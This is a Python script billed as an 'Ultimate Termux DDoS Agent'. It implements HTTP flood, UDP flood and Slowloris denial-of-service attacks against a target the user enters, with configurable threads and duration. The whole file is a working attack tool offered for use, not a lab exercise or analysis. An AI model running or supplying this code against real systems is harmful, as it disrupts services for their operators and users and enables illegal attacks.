import socket
import threading
import time
import random
import requests
import os

os.system('clear')

print("\033[91m" + r"""
 ██████╗  ██████╗ ████████╗      ██████╗  ██████╗  ██████╗ ███████╗
 ██╔══██╗ ██╔══██╗╚══██╔══╝█████╗██╔══██╗ ██╔══██╗██╔═══██╗██╔════╝
 ██║  ██║ ██████╔╝   ██║   ╚════╝██║  ██║ ██║  ██║██║   ██║███████╗
 ██║  ██║ ██╔═══╝    ██║         ██║  ██║ ██║  ██║██║   ██║╚════██║
 ██████╔╝ ██║        ██║         ██████╔╝ ██████╔╝╚██████╔╝███████║
 ╚═════╝  ╚═╝        ╚═╝         ╚═════╝  ╚═════╝  ╚══════╝ ╚══════╝
""" + "\033[0m")
print("\033[92m                 [+] Created by Dhanush [+]\033[0m")
print("\033[96m               [ Ultimate Termux DDoS Agent ]\033[0m\n")

def http_flood(target, threads=1000, duration=300):
    print(f"\033[93m[+] Launching HTTP Flood on {target} with {threads} threads\033[0m")
    def attack():
        while True:
            try:
                headers = {'User-Agent': f'Mozilla/5.0 (Random{random.randint(100000,999999)})'}
                requests.get(target, headers=headers, timeout=0.5)
            except:
                pass
    for _ in range(threads):
        threading.Thread(target=attack, daemon=True).start()
    time.sleep(duration)

def udp_flood(target_ip, port=80, threads=1000, duration=300):
    print(f"\033[93m[+] Launching UDP Flood on {target_ip}:{port}\033[0m")
    def attack():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes_data = random._urandom(4096)
        while True:
            try:
                sock.sendto(bytes_data, (target_ip, port))
            except:
                pass
    for _ in range(threads):
        threading.Thread(target=attack, daemon=True).start()
    time.sleep(duration)

def slowloris(target, threads=500, duration=300):
    print(f"\033[93m[+] Launching Slowloris Attack on {target}\033[0m")
    # Simple slowloris implementation
    def attack():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((target.replace("http://","").replace("https://","").split("/")[0], 80))
                s.send(b"GET / HTTP/1.1\r\nHost: " + target.encode() + b"\r\n")
                time.sleep(10)
            except:
                pass
    for _ in range(threads):
        threading.Thread(target=attack, daemon=True).start()
    time.sleep(duration)

if __name__ == "__main__":
    mode = input("\033[97mChoose attack mode (http/udp/slowloris/all): \033[0m").strip().lower()
    target = input("\033[97mTarget (URL or IP): \033[0m").strip()
    threads = int(input("\033[97mThreads (default 1000): \033[0m") or 1000)
    duration = int(input("\033[97mDuration in seconds (default 300): \033[0m") or 300)

    if mode in ["http", "all"]:
        if not target.startswith("http"):
            target = "http://" + target
        http_flood(target, threads, duration)
    if mode in ["udp", "all"]:
        port = int(input("\033[97mUDP Port (default 80): \033[0m") or 80)
        udp_flood(target, port, threads, duration)
    if mode in ["slowloris", "all"]:
        slowloris(target.replace("http://","").replace("https://","").split("/")[0], threads, duration)

    print("\033[91mAttack finished.\033[0m")
